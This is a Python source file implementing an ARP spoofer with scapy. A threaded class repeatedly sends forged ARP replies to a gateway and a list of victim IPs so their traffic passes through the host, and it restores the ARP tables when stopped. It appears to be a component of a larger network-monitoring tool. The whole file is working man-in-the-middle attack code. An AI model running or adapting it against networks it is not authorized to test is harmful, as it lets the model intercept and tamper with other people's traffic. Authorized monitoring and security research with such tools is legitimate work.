import time
import threading
import scapy.all as sc
import logging

class ARP_spoofer:
    def __init__(self, host_state):
        self._host_state = host_state
        self.lock = threading.Lock()
        self._active = False
        self._thread = threading.Thread(target=self.arp_spoof_loop)
        # make it a daemon so that it stops when the host state stops
        self._thread.daemon = True

        # ARP parameters
        self.victim_ip_list = []
        self.gateway_mac = None

    def start(self):
        """starts the ARP spoofing thread. To be called by host state"""
        with self.lock:
            self._active = True
        logging.info("[ARP spoofer] ARP spoofing starting")
        self._thread.start()

    def stop(self):
        """stops the ARP spoofing thread, to be called by host state to end the thread"""
        logging.info("[ARP spoofer] ARP spoofing stopping")
        with self.lock:
            self._active = False
        self.arp_restore()
        return

    def get_mac(self, ip_address):
        """Sends an ARP request and waits for a reply to obtain the MAC of the given IP address"""
        mac_query = sc.ARP(op = 1, hwdst = "ff:ff:ff:ff:ff:ff", pdst = ip_address)
        mac_query_ans, _ = sc.sr(mac_query, timeout=5, verbose=False)
        for _, mac_query_response in mac_query_ans:
            return mac_query_response[sc.ARP].hwsrc
        # if no response, return None
        return None

    def arp_spoof(self, mac_gateway, mac_victim, ip_gateway, ip_victim, mac_host):
        """Sends 2 spoofing ARP packets"""
        #trick gateway
        sc.send(sc.ARP(op=2, pdst=ip_gateway, hwdst=mac_gateway, psrc=ip_victim, hwsrc=mac_host), verbose=False)
        # trick victim
        sc.send(sc.ARP(op=2, pdst=ip_victim, hwdst=mac_victim, psrc=ip_gateway, hwsrc=mac_host), verbose=False)

    def arp_restore(self):
        """Restores ARP table by sending ARP packets with the real MAC addresses to end ARP spoofing"""

        ip_to_mac = self._host_state.get_arp_table()
        for ip_victim in self.victim_ip_list:
            mac_victim = ip_to_mac[ip_victim]
            with self._host_state.lock:
                ip_gateway = self._host_state.gateway_ip
                mac_gateway = ip_to_mac[self._host_state.gateway_ip]

            sc.send(sc.ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_gateway, hwsrc=mac_victim, psrc=ip_victim), verbose=False)
            sc.send(sc.ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_victim, hwsrc=mac_gateway, psrc=ip_gateway), verbose=False)
        return



    def arp_spoof_loop(self):
        """At each iteration obtains MAC addresses of targeted IPs and spoof their ARP tables"""
        while True:
            # wait between 2 spoofing packets
            time.sleep(2)
            # logging.debug("[ARP spoofer] New iteration: check if active")
            with self.lock:
                #check if the thread has to stop
                if not self._active:
                    # if no longer active, return and end the process
                    return

            # logging.debug("[ARP spoofer] Obtaining the ARP table")
            with self._host_state.lock:
                if self._host_state.gateway_ip is None:
                    logging.error("[ARP spoofer] Gateway IP is not set")
                    return
                gateway_ip = self._host_state.gateway_ip
                if self.gateway_mac is None:
                    self.gateway_mac = self.get_mac(self._host_state.gateway_ip)
            gateway_mac = self.gateway_mac
            self._host_state.set_arp_table(gateway_ip, gateway_mac)

            ip_to_mac = self._host_state.get_arp_table()

            # logging.debug("[ARP spoofer] Victims to spoof: %s" , self.victim_ip_list)
            for victim_ip in self.victim_ip_list:
                if victim_ip in ip_to_mac:
                    victim_mac = ip_to_mac[victim_ip]
                else:
                    logging.debug("[ARP spoofer] obtaining MAC of %s", victim_ip)
                    mac = self.get_mac(victim_ip)
                    if mac is not None:
                        self._host_state.set_arp_table(victim_ip, mac)
                        victim_mac = mac
                    else:
                        logging.warning("[ARP spoofer] Could not obtain MAC of %s, not spoofing this host", victim_ip)
                        continue
                # logging.debug("[ARP spoofer] Sending ARP spoofing packets to %s", victim_ip)
                mac_host = self._host_state.host_mac
                self.arp_spoof(gateway_mac, victim_mac, gateway_ip, victim_ip, mac_host)

if __name__ == "__main__":
    ip_target = "192.168.1.46"
    packet = sc.ARP(op = 1, hwdst = "ff:ff:ff:ff:ff:ff", pdst = ip_target)
    ans = sc.sr1(packet, timeout=10, verbose=True)
    for r in ans:
        print(r[sc.ARP].hwsrc)